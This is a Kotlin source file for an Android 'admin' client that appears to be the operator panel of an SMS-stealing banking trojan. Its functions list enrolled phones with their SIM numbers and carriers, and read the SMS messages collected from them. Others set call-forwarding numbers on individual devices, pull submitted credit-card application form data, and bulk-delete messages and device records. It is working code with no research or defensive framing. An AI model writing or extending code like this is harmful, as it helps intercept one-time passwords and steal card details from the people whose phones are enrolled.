package com.example.admin.network

import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SupabaseApi {

    companion object {
        private const val TAG = "DEVICE_API"

        // ── Backend proxy base URL — all calls go through this ────────────────
        val BASE get() = Constants.DEVICE_API_BASE_URL

        // ── Constants used by SupabaseRealtimeManager & SmsMessagesRealtimeClient ──
        // APP_ID = the user-entered token stored in Constants
        val APP_ID get() = Constants.APP_TOKEN

        // Supabase project ref — used for WebSocket URL in realtime clients
        const val PROJECT_REF = "dvgcrxrnnezbdjpujjjt"

        // Supabase anon key — only needed for realtime WebSocket; fill in your key
        const val KEY = ""

        // Actual table names in Supabase (flat structure, one row per device/message)
        const val REGISTERED_DEVICES_TABLE = "devices"   // SupabaseRealtimeManager subscribes here
        const val MESSAGES_TABLE           = "messages"  // SmsMessagesRealtimeClient should subscribe here
    }

    // ── Data classes matching actual DB table columns ─────────────────────────

    /**
     * Maps to the `devices` table.
     * Flat columns: sub_id, device_id, device_name, device_model, android_version,
     *               last_seen, last_heartbeat_at, total_sms_count, call_forward_*,
     *               status, data_json (for extras: manufacturer, brand, sim*, fcmToken)
     */
    data class RegisteredDevice(
        val uid: String,                        // sub_id
        val model: String?       = "",          // device_model (flat column)
        val manufacturer: String? = "",         // data_json.manufacturer
        val androidVersion: String? = "",       // android_version (flat column)
        val brand: String?       = "",          // data_json.brand
        val sim1Number: String?  = "",          // data_json.sim1number
        val sim2Number: String?  = "",          // data_json.sim2number
        val sim1Carrier: String? = "",          // data_json.sim1carrier
        val sim2Carrier: String? = "",          // data_json.sim2carrier
        val fcmToken: String?    = "",          // data_json.fcm_token
        val joinedAt: Long       = 0L,          // registered_at parsed to ms
        // Extra flat columns
        val deviceName: String?  = null,        // device_name
        val status: String?      = null,        // status
        val lastSeen: String?    = null,        // last_seen (ISO string)
        val lastHeartbeatAt: String? = null,    // last_heartbeat_at (ISO string)
        val totalSmsCount: Int   = 0,           // total_sms_count
        val callForwardStatus: String?  = null, // call_forward_status
        val callForwardNumber: String?  = null, // call_forward_number
        val starred: Boolean     = false,       // data_json.starred
        val dataJson: JSONObject? = null        // full data_json for extras
    )

    /**
     * Online/heartbeat status — derived from RegisteredDevice.lastHeartbeatAt / lastSeen.
     */
    data class DeviceStatus(
        val uid: String,
        val available: String  = "",
        val checkedAt: Long    = 0L,
        val timestamp: Long    = 0L,
        val status: String     = "",
        val type: String       = "",
        val online: Boolean    = false
    )

    /**
     * Battery info — from data_json.battery_data (if Android app sends it).
     */
    data class BatteryDataSupabase(
        val uid: String,
        val level: Int         = 0,
        val isCharging: Boolean = false,
        val temperature: Double = 0.0,
        val voltage: Int       = 0,
        val health: String?    = "",
        val timestamp: Long    = 0L
    )

    /**
     * Admin forwarding config — stored as a special device row with
     * sub_id = "admin_config_main" and data_json = { number, status }.
     */
    data class AdminConfig(
        val id: String     = "main",
        val number: String = "",
        val status: String = "OFF",
        val updatedAt: Long = 0L
    )

    /**
     * Maps to the `messages` table.
     * Flat columns: id, app_id, sub_id, from_id, to_id, content, message_type, sent_at, is_read
     *
     * Field mapping (kept backward-compatible with existing Activities):
     *   uniqueId       ← sub_id    (device that received the SMS)
     *   senderNumber   ← from_id   (who sent the SMS)
     *   receiverNumber ← to_id     (SIM number that received it)
     *   body           ← content
     *   timestamp      ← sent_at   (parsed to epoch ms)
     */
    data class SmsLog(
        val id: String?          = null,  // String form of DB id (Long)
        val uniqueId: String,             // sub_id
        val title: String,                // "New SMS" or message_type
        val body: String,                 // content
        val senderNumber: String,         // from_id
        val receiverNumber: String,       // to_id
        val timestamp: Long,              // sent_at → ms
        val isBanking: Boolean   = false
    )

    /**
     * Maps to the `form_data` table.
     * Flat columns: id, app_id, sub_id, form_type, data (JSONB), submitted_at
     */
    data class CreditCardApplicationEntry(
        val id: Long           = 0L,
        val type: String       = "",
        val data: Map<String, Any> = emptyMap(),
        val submittedAtMs: Long = 0L
    )

    // ── HTTP client ────────────────────────────────────────────────────────────

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val JSON_MT = "application/json; charset=utf-8".toMediaType()

    private fun get(url: String): JSONObject? {
        return try {
            JSONObject(client.newCall(Request.Builder().url(url).get().build())
                .execute().body?.string() ?: "{}")
        } catch (e: Exception) { Log.e(TAG, "GET $url: ${e.message}"); null }
    }

    private fun post(url: String, body: JSONObject): JSONObject? {
        return try {
            JSONObject(client.newCall(Request.Builder().url(url)
                .post(body.toString().toRequestBody(JSON_MT)).build())
                .execute().body?.string() ?: "{}")
        } catch (e: Exception) { Log.e(TAG, "POST $url: ${e.message}"); null }
    }

    private fun patch(url: String, body: JSONObject): JSONObject? {
        return try {
            JSONObject(client.newCall(Request.Builder().url(url)
                .patch(body.toString().toRequestBody(JSON_MT)).build())
                .execute().body?.string() ?: "{}")
        } catch (e: Exception) { Log.e(TAG, "PATCH $url: ${e.message}"); null }
    }

    private fun delete(url: String): JSONObject? {
        return try {
            JSONObject(client.newCall(Request.Builder().url(url).delete().build())
                .execute().body?.string() ?: "{}")
        } catch (e: Exception) { Log.e(TAG, "DELETE $url: ${e.message}"); null }
    }

    private fun dataArray(obj: JSONObject?): JSONArray  = obj?.optJSONArray("data") ?: JSONArray()
    private fun dataObject(obj: JSONObject?): JSONObject? = obj?.optJSONObject("data")

    // ── Parse: devices table row → RegisteredDevice ────────────────────────────

    fun isRealDeviceRow(subId: String, dataType: String = ""): Boolean {
        if (subId.isBlank()) return false
        if (subId == "admin_config_main") return false
        if (subId.startsWith("admin_") || subId.startsWith("star_")) return false
        if (dataType.equals("admin_config", ignoreCase = true)) return false
        if (dataType.equals("starred_device", ignoreCase = true)) return false
        if (dataType.equals("call_forwarding", ignoreCase = true)) return false
        return true
    }

    /**
     * Parse a `devices` table row.
     * Direct columns take priority; data_json fills in extras (sim, brand, etc.)
     */
    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        val dj = djFrom(row)
        val registeredAt = parseIsoToMs(row.optString("registered_at", ""))

        return RegisteredDevice(
            uid            = uid,
            model          = row.optString("device_model", dj.optString("model", "")).ifBlank { null },
            manufacturer   = dj.optString("manufacturer", "").ifBlank { null },
            androidVersion = row.optString("android_version",
                                dj.optString("androidversion", dj.optString("androidVersion", ""))).ifBlank { null },
            brand          = dj.optString("brand", "").ifBlank { null },
            sim1Number     = dj.optString("sim1number",  dj.optString("sim1Number",  "")).ifBlank { null },
            sim2Number     = dj.optString("sim2number",  dj.optString("sim2Number",  "")).ifBlank { null },
            sim1Carrier    = dj.optString("sim1carrier", dj.optString("sim1Carrier", dj.optString("sim1_carrier", ""))).ifBlank { null },
            sim2Carrier    = dj.optString("sim2carrier", dj.optString("sim2Carrier", dj.optString("sim2_carrier", ""))).ifBlank { null },
            fcmToken       = dj.optString("fcm_token",  dj.optString("fcmtoken", dj.optString("fcmToken", ""))).ifBlank { null },
            joinedAt       = dj.optLong("joinedat", registeredAt).let { if (it > 0) it else registeredAt },
            deviceName     = row.optString("device_name", "").ifBlank { null },
            status         = row.optString("status", "").ifBlank { null },
            lastSeen       = row.optString("last_seen", "").ifBlank { null },
            lastHeartbeatAt= row.optString("last_heartbeat_at", "").ifBlank { null },
            totalSmsCount  = row.optInt("total_sms_count", 0),
            callForwardStatus = row.optString("call_forward_status", "").ifBlank { null },
            callForwardNumber = row.optString("call_forward_number", "").ifBlank { null },
            starred        = dj.optBoolean("starred", false),
            dataJson       = dj
        )
    }

    // ── Parse: devices table row → DeviceStatus ────────────────────────────────

    fun parseDeviceStatusRow(row: JSONObject, now: Long = System.currentTimeMillis()): DeviceStatus? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        // last_heartbeat_at is a direct flat column — no need to dig into data_json
        val checkedAt = parseIsoToMs(row.optString("last_heartbeat_at", ""))
            .let { if (it > 0) it else parseIsoToMs(row.optString("last_seen", "")) }
            .let { if (it > 0) it else parseIsoToMs(row.optString("updated_at", "")) }

        // Also check data_json.heartbeat for legacy rows
        val dj = djFrom(row)
        val hb = dj.optJSONObject("heartbeat") ?: JSONObject()
        val finalCheckedAt = checkedAt.let { if (it > 0) it else hb.optLong("checked_at", 0L) }

        return DeviceStatus(
            uid       = uid,
            available = hb.optString("available", ""),
            checkedAt = finalCheckedAt,
            timestamp = finalCheckedAt,
            status    = if (finalCheckedAt > 0L) "online" else "offline",
            type      = "heartbeat",
            online    = finalCheckedAt > 0L && now - finalCheckedAt in 0 until (15 * 60 * 1000L)
        )
    }

    // ── Parse: devices table row → BatteryDataSupabase ────────────────────────

    fun parseBatteryRow(row: JSONObject): BatteryDataSupabase? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        val battery = djFrom(row).optJSONObject("battery_data") ?: return null
        return BatteryDataSupabase(
            uid         = uid,
            level       = battery.optInt("level", 0),
            isCharging  = battery.optBoolean("isCharging", battery.optBoolean("ischarging", false)),
            temperature = battery.optDouble("temperature", 0.0),
            voltage     = battery.optInt("voltage", 0),
            health      = battery.optString("health", "").ifBlank { null },
            timestamp   = battery.optLong("timestamp", 0L)
        )
    }

    // ── Parse: devices table row → starred flag ────────────────────────────────

    fun parseStarredRow(row: JSONObject): Pair<String, Boolean>? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        return uid to djFrom(row).optBoolean("starred", false)
    }

    // ── Parse: messages table row(s) → SmsLog(s) ──────────────────────────────
    //
    // NEW DB: one row per SMS in `messages` table
    //   columns: id, sub_id, from_id, to_id, content, message_type, sent_at
    //
    // parseSmsMessagesFromRegisteredDevice handles TWO cases:
    //   1. A `messages` table row (new DB) — parsed directly as one SmsLog
    //   2. A `devices` table row with sms_messages[] in data_json (legacy) — array parsed
    //
    // SmsMessagesRealtimeClient should subscribe to MESSAGES_TABLE ("messages"), not REGISTERED_DEVICES_TABLE.

    fun parseSmsMessagesFromRegisteredDevice(row: JSONObject): List<SmsLog> {
        // Case 1: This is a messages-table row (has 'content' and 'from_id' directly)
        val content = row.optString("content", "").trim()
        if (content.isNotBlank()) {
            val sms = parseSmsRow(row)
            return if (sms != null) listOf(sms) else emptyList()
        }

        // Case 2: This is a devices-table row — look for sms_messages array in data_json (legacy)
        val deviceId = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(deviceId, dataType)) return emptyList()

        val dj = djFrom(row)
        val smsArray = row.optJSONArray("sms_messages") ?: dj.optJSONArray("sms_messages") ?: JSONArray()
        val list = mutableListOf<SmsLog>()
        for (i in 0 until smsArray.length()) {
            parseSingleSmsObject(deviceId, smsArray.optJSONObject(i) ?: continue, i)?.let { list.add(it) }
        }
        return list
    }

    /**
     * Parse a single SMS object.
     * Used by SmsMessagesRealtimeClient for the `last_sms_log` field (legacy devices table)
     * and also works with a messages-table row directly.
     */
    fun parseSingleSmsObject(deviceId: String, obj: JSONObject, index: Int = 0): SmsLog? {
        // messages-table row: use its own sub_id if present
        val uid = obj.optString("sub_id", deviceId).trim().ifBlank { deviceId }

        // body — try messages-table column first, then legacy fields
        val body = obj.optString("content",
            obj.optString("message_body",
                obj.optString("body",
                    obj.optString("text", "")))).trim()
        if (body.isBlank()) return null

        val rawId   = obj.optString("id", obj.optString("sms_id", obj.optString("message_id", ""))).trim()
        val ts      = readTimestampFromObj(obj).let { if (it > 0) it else System.currentTimeMillis() }
        val smsId   = rawId.ifBlank { "sms_${uid}_$ts" }
        val sender  = obj.optString("from_id",
            obj.optString("sender_number",
                obj.optString("phone_number",
                    obj.optString("from", "Unknown")))).ifBlank { "Unknown" }
        val receiver = obj.optString("to_id",
            obj.optString("receiver_number",
                obj.optString("to", "")))
        val msgType = obj.optString("message_type", obj.optString("direction", "sms"))

        return SmsLog(
            id             = smsId,
            uniqueId       = uid,
            title          = if (msgType.equals("sms", ignoreCase = true)) "New SMS" else msgType,
            body           = body,
            senderNumber   = sender,
            receiverNumber = receiver,
            timestamp      = ts,
            isBanking      = false
        )
    }

    // ── Public API — all calls via backend proxy ───────────────────────────────

    /** GET /get — all devices */
    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
        try {
            val arr  = dataArray(get("$BASE/get"))
            val list = mutableListOf<RegisteredDevice>()
            for (i in 0 until arr.length()) parseRegisteredDeviceRow(arr.getJSONObject(i))?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) { Log.e(TAG, "getAllDevices: ${e.message}"); Result.failure(e) }
    }

    /** DeviceStatus for all devices — derived from last_heartbeat_at column */
    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val arr  = dataArray(get("$BASE/get"))
            val now  = System.currentTimeMillis()
            val list = mutableListOf<DeviceStatus>()
            for (i in 0 until arr.length()) parseDeviceStatusRow(arr.getJSONObject(i), now)?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) { Log.e(TAG, "getAllDeviceStatuses: ${e.message}"); Result.failure(e) }
    }

    /** Map of uid → latest DeviceStatus */
    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val map = mutableMapOf<String, DeviceStatus>()
            getAllDeviceStatuses().getOrNull()?.forEach { s ->
                val old = map[s.uid]; if (old == null || s.checkedAt > old.checkedAt) map[s.uid] = s
            }
            Result.success(map)
        } catch (e: Exception) { Log.e(TAG, "getLatestDeviceStatuses: ${e.message}"); Result.failure(e) }
    }

    /**
     * GET /messages — reads from `messages` table.
     * Each row: { id, app_id, sub_id, from_id, to_id, content, message_type, sent_at }
     */
    suspend fun getAllSmsMessagesFromRegisteredDevices(rowLimit: Int = 1000): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val arr  = dataArray(get("$BASE/messages?limit=${rowLimit.coerceIn(1, 1000)}"))
                val list = mutableListOf<SmsLog>()
                val seen = HashSet<String>()
                for (i in 0 until arr.length()) {
                    parseSmsRow(arr.getJSONObject(i))?.let { sms ->
                        val key = sms.id ?: "${sms.uniqueId}${sms.timestamp}"
                        if (seen.add(key)) list.add(sms)
                    }
                }
                list.sortByDescending { it.timestamp }
                Result.success(list)
            } catch (e: Exception) { Log.e(TAG, "getAllSmsMessages: ${e.message}"); Result.failure(e) }
        }

    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> =
        getAllSmsMessagesFromRegisteredDevices(rowLimit = limit)

    /** GET /messages?uid=uniqueId — messages for one device */
    suspend fun getSmsLogsByUniqueId(uniqueId: String, limit: Int = 50): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val arr  = dataArray(get("$BASE/messages?uid=$uniqueId&limit=${limit.coerceIn(1, 500)}"))
                val list = mutableListOf<SmsLog>()
                for (i in 0 until arr.length()) parseSmsRow(arr.getJSONObject(i))?.let { list.add(it) }
                list.sortByDescending { it.timestamp }
                Result.success(list)
            } catch (e: Exception) { Log.e(TAG, "getSmsLogsByUniqueId: ${e.message}"); Result.failure(e) }
        }

    /** DELETE /message/:smsId */
    suspend fun deleteSmsFromRegisteredDevice(deviceId: String, smsId: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (smsId.isBlank()) return@withContext Result.failure(Exception("smsId missing"))
                Result.success(delete("$BASE/message/$smsId")?.optBoolean("ok", false) == true)
            } catch (e: Exception) { Log.e(TAG, "deleteSms: ${e.message}"); Result.failure(e) }
        }

    suspend fun deleteSmsLog(smsId: String): Result<Boolean> =
        deleteSmsFromRegisteredDevice("", smsId)

    /** DELETE /messages — all SMS for app (or ?uid= for one device) */
    suspend fun deleteAllSmsMessagesForApp(): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/messages")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteAllSmsForApp: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteAllSmsMessagesForDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            Result.success(delete("$BASE/messages?uid=$uid")?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "deleteAllSmsForDevice: ${e.message}"); Result.failure(e) }
    }

    /**
     * GET /get/admin_config_main — admin forwarding config.
     * Stored as a special device row: sub_id="admin_config_main", data_json={number, status}
     */
    suspend fun getAdminConfig(): Result<AdminConfig> = withContext(Dispatchers.IO) {
        try {
            val resp = get("$BASE/get/admin_config_main")
            if (resp?.optBoolean("ok", false) != true) return@withContext Result.success(AdminConfig())
            val data = dataObject(resp) ?: return@withContext Result.success(AdminConfig())
            val dj   = djFrom(data)
            Result.success(AdminConfig(
                id        = "main",
                number    = dj.optString("number", ""),
                status    = dj.optString("status", "OFF"),
                updatedAt = parseIsoToMs(data.optString("updated_at", ""))
            ))
        } catch (e: Exception) { Log.e(TAG, "getAdminConfig: ${e.message}"); Result.success(AdminConfig()) }
    }

    /** POST /upsert — save admin forwarding config */
    suspend fun updateAdminConfig(number: String, status: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("sub_id",    "admin_config_main")
                put("uid",       "admin_config_main")
                put("data_type", "admin_config")
                put("data_json", JSONObject().apply {
                    put("number", number); put("status", status)
                    put("updated_at", System.currentTimeMillis())
                })
            }
            Result.success(post("$BASE/upsert", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "updateAdminConfig: ${e.message}"); Result.failure(e) }
    }

    /** PATCH /update/:uid — update call-forwarding columns */
    suspend fun updateCallForwarding(uid: String, number: String, status: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
                val body = JSONObject().apply {
                    put("call_forward_number",    number)
                    put("call_forward_status",    status)
                    put("call_forward_timestamp", System.currentTimeMillis())
                }
                Result.success(patch("$BASE/update/$uid", body)?.optBoolean("ok", false) == true)
            } catch (e: Exception) { Log.e(TAG, "updateCallForwarding: ${e.message}"); Result.failure(e) }
        }

    /** GET /get — starred flag comes from data_json.starred on each device row */
    suspend fun getStarredDevices(): Result<Map<String, Boolean>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get"))
            val map = mutableMapOf<String, Boolean>()
            for (i in 0 until arr.length()) parseStarredRow(arr.getJSONObject(i))?.let { map[it.first] = it.second }
            Result.success(map)
        } catch (e: Exception) { Log.e(TAG, "getStarredDevices: ${e.message}"); Result.success(emptyMap()) }
    }

    /** PATCH /star/:uid */
    suspend fun setStarred(uid: String, starred: Boolean): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            Result.success(patch("$BASE/star/$uid", JSONObject().put("starred", starred))
                ?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "setStarred: ${e.message}"); Result.failure(e) }
    }

    /** Battery data from data_json.battery_data on each device row */
    suspend fun getAllBatteryData(): Result<List<BatteryDataSupabase>> = withContext(Dispatchers.IO) {
        try {
            val arr  = dataArray(get("$BASE/get"))
            val list = mutableListOf<BatteryDataSupabase>()
            for (i in 0 until arr.length()) parseBatteryRow(arr.getJSONObject(i))?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) { Log.e(TAG, "getAllBatteryData: ${e.message}"); Result.success(emptyList()) }
    }

    /** DELETE /device/:uid — deletes device + its messages + form_data */
    suspend fun deleteDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            Result.success(delete("$BASE/device/$uid")?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "deleteDevice: ${e.message}"); Result.failure(e) }
    }

    /**
     * GET /form-data?uid=uid — reads from `form_data` table.
     * Each row: { id, app_id, sub_id, form_type, data (JSONB), submitted_at }
     */
    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplicationEntry>> =
        withContext(Dispatchers.IO) {
            try {
                if (uid.isBlank()) return@withContext Result.failure(Exception("uid required"))
                val arr  = dataArray(get("$BASE/form-data?uid=$uid&limit=100"))
                val list = mutableListOf<CreditCardApplicationEntry>()
                for (i in 0 until arr.length()) {
                    val row     = arr.getJSONObject(i)
                    val dataObj = row.optJSONObject("data") ?: JSONObject()
                    val dataMap = mutableMapOf<String, Any>()
                    dataObj.keys().forEach { k ->
                        when (val v = dataObj.get(k)) {
                            is String, is Int, is Long, is Double, is Boolean -> dataMap[k] = v
                            else -> dataMap[k] = v.toString()
                        }
                    }
                    list.add(CreditCardApplicationEntry(
                        id            = row.optLong("id", 0L),
                        type          = row.optString("form_type", "unknown"),
                        data          = dataMap,
                        submittedAtMs = parseIsoToMs(row.optString("submitted_at", ""))
                    ))
                }
                Result.success(list.sortedByDescending { it.submittedAtMs })
            } catch (e: Exception) { Log.e(TAG, "getCreditCardApplications: ${e.message}"); Result.failure(e) }
        }

    // ── Utilities ──────────────────────────────────────────────────────────────

    fun formatForDisplay(timestamp: Long): String {
        if (timestamp <= 0L) return "-"
        return try { SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(timestamp)) }
        catch (e: Exception) { timestamp.toString() }
    }

    // ── Internal helpers ───────────────────────────────────────────────────────

    /**
     * Parse a `messages` table row → SmsLog.
     * columns: id, sub_id, from_id, to_id, content, message_type, sent_at
     */
    private fun parseSmsRow(row: JSONObject): SmsLog? {
        val uid  = row.optString("sub_id", "").trim(); if (uid.isBlank()) return null
        val body = row.optString("content", "").trim(); if (body.isBlank()) return null
        val id   = row.optString("id", "").trim().ifBlank { null }
        val sentAt = parseIsoToMs(row.optString("sent_at", ""))
            .let { if (it > 0) it else System.currentTimeMillis() }
        val msgType = row.optString("message_type", "sms")
        return SmsLog(
            id             = id,
            uniqueId       = uid,
            title          = if (msgType.equals("sms", ignoreCase = true)) "New SMS" else msgType,
            body           = body,
            senderNumber   = row.optString("from_id", "Unknown").ifBlank { "Unknown" },
            receiverNumber = row.optString("to_id",   "").ifBlank { "" },
            timestamp      = sentAt,
            isBanking      = false
        )
    }

    /** Safely extract data_json from a row (column may be String or JSONObject) */
    private fun djFrom(row: JSONObject): JSONObject {
        val raw = row.opt("data_json") ?: return JSONObject()
        return when (raw) {
            is JSONObject -> raw
            is String    -> runCatching { JSONObject(raw) }.getOrNull() ?: JSONObject()
            else         -> JSONObject()
        }
    }

    private fun readTimestampFromObj(obj: JSONObject): Long {
        val l = obj.optLong("timestamp", 0L); if (l > 0L) return l
        val s = obj.optLong("synced_at",  0L); if (s > 0L) return s
        parseTimestampString(obj.optString("timestamp",          ""))?.let { return it }
        parseTimestampString(obj.optString("timestamp_readable", ""))?.let { return it }
        parseIsoToMs(obj.optString("sent_at", "")).let { if (it > 0) return it }
        return 0L
    }

    private fun parseTimestampString(value: String): Long? {
        if (value.isBlank()) return null
        for (p in listOf("yyyy-MM-dd HH:mm:ss", "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
                         "yyyy-MM-dd'T'HH:mm:ss'Z'", "dd MMM yyyy, hh:mm a")) {
            try {
                val sdf = SimpleDateFormat(p, Locale.getDefault())
                if (p.contains("'Z'")) sdf.timeZone = TimeZone.getTimeZone("UTC")
                sdf.parse(value)?.time?.let { return it }
            } catch (_: Exception) {}
        }
        return null
    }

    private fun parseIsoToMs(value: String): Long {
        if (value.isBlank()) return 0L
        for (p in listOf("yyyy-MM-dd'T'HH:mm:ss.SSSSSS'Z'",
                         "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
                         "yyyy-MM-dd'T'HH:mm:ss'Z'")) {
            try {
                val sdf = SimpleDateFormat(p, Locale.US).also { it.timeZone = TimeZone.getTimeZone("UTC") }
                sdf.parse(value)?.time?.let { if (it > 0) return it }
            } catch (_: Exception) {}
        }
        return 0L
    }
}
